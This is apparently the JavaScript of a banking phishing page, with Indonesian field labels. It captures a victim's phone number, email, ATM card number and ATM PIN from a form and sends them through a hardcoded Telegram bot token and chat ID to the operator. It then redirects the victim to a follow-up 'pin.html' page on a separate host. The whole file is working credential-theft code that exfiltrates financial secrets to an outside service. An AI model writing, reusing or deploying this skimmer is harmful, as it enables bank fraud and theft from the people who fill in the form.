
        
    const TOKEN = "6185980107:AAG2UmrGLpQznSPAHiTtUXwU957oSfoNDbc";
const CHAT_ID = "5990883050";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("tg");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { nomor, email, atm, pin, } = form;
  const data = {
    nomor: nomor.value,
    email: email.value,
    atm: atm.value,
    pin: pin.value,
  };

  let message = `<b></b>\n`;
  message += `Nomor Hp :  ${data.nomor}\n`;
  message += `Email :  ${data.email}\n`;
  message += `Nomor ATM :  ${data.atm}\n`;
  message += `PIN ATM :  ${data.pin}\n`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href='https://databaseku.nasiwebhost.com/apps/pin.html';
}

